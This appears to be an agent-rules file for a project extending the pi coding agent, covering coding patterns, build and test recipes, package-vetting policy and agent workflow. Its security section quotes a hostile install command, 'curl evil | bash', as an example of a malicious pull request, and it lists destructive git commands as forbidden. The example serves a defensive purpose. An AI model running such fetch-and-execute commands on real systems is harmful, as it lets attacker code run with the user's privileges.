# pij — Agent Rules

> **The harness is the product.** pij runs on two harnesses, layered:
> the **engineering harness** (`npm` scripts, `harness/`, smoke/driver SDK,
> seed data — what humans and CI invoke) and the **agent harness** (the
> Boot/Interact/Observe loop, minih agent packs in `agents/`, the retros
> ledger at `docs/retros/`, this file). The agent harness sits **on top
> of** the engineering one and cannot exist without it. Every extension is
> an exercise; every difficulty is a gift to encode; every agent run is a
> usability study. **If a session ends without one of the harnesses
> improving, something went wrong.** Ground on this at session start with
> `/eng-harness-flow` (or `harness boot`) before touching code.

## Inherited from pi-mono (do not violate without explicit user approval)

- No `any` types unless absolutely necessary.
- No inline imports — never `await import("./foo.js")`, never
  `import("pkg").Type` in type positions, no dynamic imports for types.
  Always top-level standard imports.
- Never hardcode keybindings; use a configurable matching object
  (`DEFAULT_*_KEYBINDINGS`).
- Biome check (errors and warnings) before commit: `just lint`.
- Type-check: `just typecheck` (`tsc --noEmit`).
- Tests: `just test`. Run from the package root.
- Read files in full before wide-ranging changes; do not rely solely on
  search snippets.
- Never use `git add -A` / `git add .`. Use specific file paths.
- Never bypass hooks (`--no-verify`, `--no-gpg-sign`).
- Never `git reset --hard`, `git checkout .`, `git clean -fd`,
  `git stash` without explicit user approval.

## pij-specific (Patterns P1–P10 from workshop 003)

1. **T2 layout by default**: `.pi/extensions/<name>/{index,store,test}.ts`.
   T1 (single file) only for <80 LOC, single-concern extensions.
2. **Pi-free store**: `store.ts` imports nothing from `@earendil-works/*`.
3. **Inject side effects via constructor.** No global mutable state.
4. **Tagged-union returns** (`{ ok, ... }`) over throws.
5. **Constants live in `store.ts`** next to the data they constrain.
6. **Structural entry types** at the boundary (no cast at the call site).
7. **`.js` extension on relative imports** (NodeNext / ESM).
8. **Tests target the store**, not the wiring.
9. **Persist before mutate** (event-sourced consistency).
10. **One handler for `session_start`**, all reasons (`startup`, `reload`,
    `new`, `resume`, `fork`).

## Workflow

> **Canonical interface: `just`.** All composite gates live in the
> `justfile`; never compose npm steps by hand. `just` with no recipe
> lists every recipe. Run individual npm scripts (`npm run typecheck`
> etc.) only for IDE/tooling integration — agents drive `just`.

0. **Fresh clone / new machine: `just install`** — single-command
   bootstrap. Installs deps, installs/updates official Pi from npm, syncs
   `.pi/APPEND_SYSTEM.md` + `.pi/mcp.json` to `~/.pi/agent/`, symlinks
   local extensions globally, installs every vetted manifest package, then
   runs `just pi-doctor` to verify. Re-run any time pi's global state drifts
   (after `pi update`, after switching machines).
1. New extension: **`just new <name>`** — never hand-roll the T2
   boilerplate.
2. Iterate: `pi` from pij root + `/reload`. Type-check in another tab
   (`just typecheck` or `npm run test:watch`).
3. Test: `just test` (vitest). Tests target `store.ts`.
4. Smoke: `just smoke` before merging.
5. **Before declaring any task done — or before ship — run `harness checks`.**
   The engineering-harness gate: it runs the full deterministic **signal
   inventory** (local-path portability → typecheck → lint → test → smoke →
   `pkg audit` with `PIJ_VET_SKIP_AGENT=1` → `snapshots-check`) as individual
   stages and reports a
   per-sensor verdict — and unlike `just self-check` it runs **all** sensors, so
   one invocation surfaces every failure (`--quick` skips heavy smoke for a fast
   static+unit gate). It mirrors `just self-check` (the same composite, run
   sequentially — use whichever you prefer); **new back-pressure sensors get added
   to `.harness/extensions/checks/` so this one verb stays the single "are we
   done?" gate.** If it exits non-zero, the task is not done. The `/pre-commit`
   skill (`.pi/skills/pre-commit/SKILL.md`) encodes the full contract — invoke
   it whenever you'd otherwise consider declaring a task done or about
   to stage a commit.

## Harness tooling (v0.3)

- **Driver SDK** at `harness/driver/` — typed `Scenario`/`Step`/`Session`
  for tmux-driven end-to-end smoke. `harness/scripts/smoke.ts` is a thin
  adapter over it. Use the SDK directly when authoring rich scenarios.
- **`just link`** — symlinks `.pi/extensions/*` into
  `~/.pi/agent/extensions/` so `pi` from any cwd autoloads them.
  `just unlink` to undo. (Pi's loader resolves global extensions via
  `getAgentDir() + "/extensions"` — `~/.pi/extensions/` looks plausible
  but is silently ignored.)
- **`just update-pi`** — installs/updates the official pi binary from npm
  (`@earendil-works/pi-coding-agent@latest`) and re-applies pij's global
  harness state: prefs/MCP sync, `just link`, vetted package bootstrap,
  `pi update --extensions`, and `just pi-doctor`. Always update pi through
  this recipe so the global CLI stays official while pij's local extensions
  and config remain globally visible.
- **`just pi-doctor`** — read-only audit of pi's global state: binary
  version, extension symlinks at the correct path, packages in
  `~/.pi/agent/settings.json`, and MCP servers in `~/.pi/agent/mcp.json`.
  First diagnostic to run when "pi can't see X".
- **`npm run pkg`** — manages third-party pi extensions in
  `.pi/packages.yaml` (source of truth) → `.pi/settings.json#packages`
  (generated). Subcommands: `list` / `add <src> [note...]` / `enable <s>`
  / `disable <s>` (runs `pi remove`) / `sync`.
- **Global pi prefs and MCP config** are checked into pij as the
  source of truth — `just install` syncs them out to the global
  agent dir on every run:
    - `.pi/APPEND_SYSTEM.md` → `~/.pi/agent/APPEND_SYSTEM.md`
      (voice-input rules, response-mode prefs, SQL prefs, etc. —
      personal, applies to every pi session on the machine).
    - `.pi/mcp.json` → `~/.pi/agent/mcp.json` (perplexity + flowspace/`fs2`
      MCP servers). Config holds env-var references like
      `${PERPLEXITY_API_KEY}`, never plaintext secrets — the actual key
      lives in `~/.zshenv`.
  Per-project pi-specific MCP overrides would still go in `.pi/mcp.json`
  (which is what pij has — and `just install` reuses that file as the
  global template). Don't edit `~/.pi/agent/*` by hand; edit `.pi/*` here
  and re-run `just install`.
- **`agents/extension-validator/`** — minih agent pack that drives the
  Driver SDK to validate extensions; used in plan-004 pilot flow.
- **Engineering harness (`harness` CLI + `.harness/`)** — pij has adopted the
  ai-substrate engineering harness (governance doc `.harness/engineering-harness.md`,
  extensions in `.harness/extensions/`). Two verbs matter day-to-day:
  **`harness boot`** (fast readiness proof = typecheck + test) and
  **`harness checks`** (the full ship/done gate — the signal inventory above,
  per-sensor verdict, `--quick` to skip smoke). `harness doctor` audits what
  loaded. The CLI is an ambient tool (global npm, never a repo dep); the
  `.harness/` substrate is committed. Add a new sensor by editing
  `.harness/extensions/checks/extension.ts` (keep it in sync with `just self-check`).

## Security protocol (Plan 009)

Third-party pi extensions run with **full user privileges** and load `SKILL.md` / `AGENTS.md` / tool-description strings directly into the LLM context. Pij runs a vetter pipeline (`harness/scripts/vetters/` + `agents/package-vetter/`) over every install.

**Policy (changed 2026-06-16, per user): report-and-continue.** The pipeline now **reports** findings rather than **blocking** on them. `add`, `bootstrap`, and `audit` never refuse on stale/warn/fail — they print the findings and the agent relays them so you can decide to **keep** a package or remove it with `pkg disable <source>`. The strict, exit-coded check still exists on demand: **`npm run pkg vet <source>`**. This trades enforcement for human-in-the-loop review; the hand-edit bans and the `requires.install` shell-vector caution below still stand.

**Hard rules**:

- **Never add a package by hand-editing `.pi/packages.yaml`** — use `npm run pkg add <source>`, which runs the vetter pipeline first.
- **Never add a package by hand-editing `.pi/settings.json`** — that file is generated.
- **`pkg add` no longer blocks on a bad verdict** (report-and-continue). It installs, prints the findings, and recommends review. `--unsafe`/`--reason "<text>"` is now **optional** and only records an acceptance note in `vetted.overrides` as provenance.
- **`requires.install` is a trusted-by-design shell-command vector**. A malicious PR could set `install: 'curl evil | bash'` and `pkg bootstrap` would run it. **Reviewer responsibility**: every PR that adds or changes a `requires.install` line must be scrutinised as carefully as any shell-execution change in code.
- **Vetted entries go stale at 30 days**. `pkg bootstrap` **re-vets stale entries offline** (no LLM, no scorecard network) and **reports** their findings; it never refuses. `pkg audit` is **report-only** (always exit 0) and surfaces a REVIEW summary. Use `pkg vet <source>` when you want a hard pass/fail signal.
- **Known gap**: pi's session-start auto-install reads `.pi/settings.json#packages[]` directly and bypasses the gate. A pi-side enforcement hook is deferred (Plan 009 OQ-A); for now, never hand-edit `settings.json`.

**Workflow for adding a package** (the only supported path):

1. **Run the gate**: `just pkg add <source> [note words...]`
   - `<source>` formats: `npm:<name>` (e.g. `npm:pi-subagents`), `git:<host>/<owner>/<repo>[@ref]` (e.g. `git:github.com/foo/bar@v1.0.0`), or `https://<url>.git`.
   - Everything after `<source>` is the human-readable `note` on the entry.
   - The pipeline runs every vetter in order: `npm-audit` → `lockfile-lint` → `github-trust` → `scorecard` → `package-vetter` (live minih agent). Under report-and-continue it **prints findings and proceeds** (no refusal); `--unsafe "<reason>"` optionally records an acceptance note.
2. **Read the verdict** (the agent relays it for your decision):
   - `ok` (score=100) → vetted block + manifest entry written; nothing to review.
   - `warn` (score<100) → findings printed. Keep the package, or `pkg disable <source>` to drop it. Optionally annotate acceptance with `vetted.overrides`.
   - `fail` → **the package is still added/installed** under report-and-continue. Review the findings carefully; if you don't want it, `pkg disable <source>`. (`fail` is never silently *downgraded* to `ok` in `audit`'s effective-level math — it's surfaced, not hidden.)
3. **Review the diff** in `.pi/packages.yaml` (the new `vetted:` block) and `.pi/settings.json` (auto-regenerated `packages[]` list).
4. **Commit** the manifest change with a conventional commit (`chore(pkg): add <source>`).

If `pkg audit` later flips an existing entry to `warn` and the user wants to accept it, add a `vetted.overrides` block with **explicit rule slugs** (never a bare string):

```yaml
vetted:
  overrides:
    rules:
      - github-trust:no-license
    reason: no-LICENSE on upstream; install-only use
```

Overrides only mask the rules listed — any **new** warn finding still fails the audit. `fail` is never auto-downgraded.

**Common pitfall — module on disk but pi can't see it**: if `pi install <pkg>` ran outside `just pkg add`, the npm module lives under `.pi/npm/node_modules/` but isn't in `packages.yaml`, so pi won't auto-load it on session start. Fix by running `just pkg add <source>` to register + vet it properly.

**Recovery — a globally-installed package bricked pi** (e.g. an extension that gates every message; the `pi-vs-claude-code` `purpose-gate.ts` printing `Warning: Set a purpose first.` is the known case): this is the *inverse* of the pitfall above. A raw `pi install <source>` registers the package in the **global** `~/.pi/agent/settings.json#packages[]` (and clones it to `~/.pi/agent/git/<host>/<owner>/<repo>`), **not** in the project `.pi/packages.yaml`. So editing `.pi/packages.yaml` or running `just pkg sync` does **nothing** — that tooling only ever touches the project `.pi/settings.json` (see `harness/scripts/packages.ts`, `SETTINGS_PATH` = `PIJ_ROOT/.pi/settings.json`). To remove a global package: **`pi remove <source>`** (the canonical fix — it drops the entry from the global settings and uninstalls). If pi won't even boot far enough to run that, edit `~/.pi/agent/settings.json` by hand to delete the offending line from `packages[]` and `rm -rf ~/.pi/agent/git/<host>/<owner>/<repo>`. Always install third-party packages via `just pkg add <source>` so they go through the manifest + vetter and stay project-managed.

## Voice input — phonetic interpretation

The user drives a lot of input via voice dictation. Expect occasional
homophone swaps, adjacent-word substitutions, and minor transcription
errors. When a word seems out of place, **try the phonetic neighbour
first** before asking — common patterns:

- "MPM" → `npm`
- "to do" → `todo` (the extension)
- "pee eye" / "pie" → `pi`
- "minnie h" / "mini h" → `minih`
- "yam'l" / "yarmel" → YAML
- "just file" → `justfile`
- "pre-checking" / "pre-check" → `pre-commit` (skill)
- "scale" → "skill"

If two phonetic candidates are both plausible **and** the choice changes
what code you'd write, ask via `ask_user_question`. Otherwise pick the
one that fits the surrounding context and proceed — the user prefers
forward motion over interrogation.

## Clarification protocol

Before guessing, **ask**. When you'd otherwise type a question to the user
in plain prose, call the `ask_user_question` tool instead (provided by
`pi-askuserquestion`, auto-loaded from `.pi/packages.yaml`). It accepts an
array of 1–4 questions in one call and returns one consolidated answer.

Use it when:

- requirements are ambiguous, conflicting, or implied rather than stated
- you'd otherwise pick a non-obvious default that could surprise the user
- architectural trade-offs need a user opinion (e.g. T1 vs T2 layout,
  vitest vs node:test, sync vs eager install)
- you're about to take a destructive or hard-to-reverse action

How to use it well:

- Batch related questions in one call — don't ping-pong.
- 2–4 concrete options per question; if you'd recommend one, put it first
  with `(Recommended)` appended.
- The tool auto-adds an "Other" free-text fallback; do not add your own.
- `header` ≤ 12 chars; it's the tab label.
- Skip the tool only for trivially-answerable questions (single yes/no in
  the middle of a confirmed plan) — prefer it whenever ambiguity is real.

## Self-improvement loop

This is the core mechanism that makes the harness compound. **Not
optional** — every session contributes back.

**Magic wands** — every minih agent emits a `retrospective.magicWand` (the
one thing the agent wishes were different) and `retrospective.difficulties`
(structured friction reports) at farewell. minih auto-harvests these into
`docs/retros/<agent-slug>.md` on run completion. **Read existing retros
before booting a new agent** — they are feature requests from the most
honest users of this harness.

**Difficulty ledger** — every difficulty encountered → `docs/difficulties.md`
with severity. Every workaround → either an immediate fix (encode it) or a
wishlist entry (`stretch:` tag). For minih agent runs, `minih difficulties`
aggregates `retrospective.difficulties` across all packs (MH-001, MH-002…).
Resolved items get curated into the relevant agent's preamble so future
runs never hit them.

**Retros ledger** — `docs/retros/` is the canonical record of agent
sessions. Harvest is automatic via minih; for non-minih sessions
(e.g. plan-6 implementation phases) append the retrospective by hand
under `docs/retros/<slug>.md`. Treat unharvested retros as a P1 bug.

**Velocity log** — every phase end → row in `docs/velocity.md` with
start/end and output. Goal: each successive extension is faster than the
last (compounding judged against the v1 build wall-clock baseline; see
spec § Clarifications session 2026-05-09b — no fixed minute thresholds
are gates).

**Encode, don't document** — a wiki paragraph that says "remember to do
X" is worth nothing; an automated step that does X for you is worth
everything. Prefer a recipe, generator, template, lint rule, or pre-flight
check over prose. Pick the right home: dev-loop friction → engineering
harness (`harness/`, `npm` scripts); agent-side friction (skill confusion,
missing context, prompt regression) → agent harness (`agents/<pack>/`,
preamble edits, this file).

**Agents are real users.** Their `magicWand` feedback is feature requests
from your most honest user. Treat it that way.

## When something is unclear

- Run `/eng-harness-flow` (or `harness boot`) to re-ground on the
  philosophy + the self-improvement contract.
- Check `docs/retros/` for prior agent runs against the same surface
  — magic wands and difficulties from earlier sessions often pre-answer
  the question.
- Read workshop 001/002/003/004 in `docs/plans/001-pi-extensions/workshops/`.
- The research dossier at `docs/plans/001-pi-extensions/research-dossier.md`
  has the wider context.
- Pi ecosystem survey (third-party extensions, install paths,
  config-driven model): `docs/plans/005-pi-ecosystem-survey/research-dossier.md`.
- Driver SDK design: `docs/plans/004-agent-pilot-harness/`.
- The pi-mono source at `/Users/jordanknight/pi-hacking/pi-mono/` is the
  source of truth; query it via the FlowSpace `pi-mono` graph.

## Forbidden without explicit user approval

- Modifying the installed pi binary or the pi-mono checkout.
- Skipping any of P1–P10 in a new extension.
- Replacing the toolchain (npm scripts → just/make/pnpm/etc.).
- Publishing to npm.
- Pushing to a public remote.
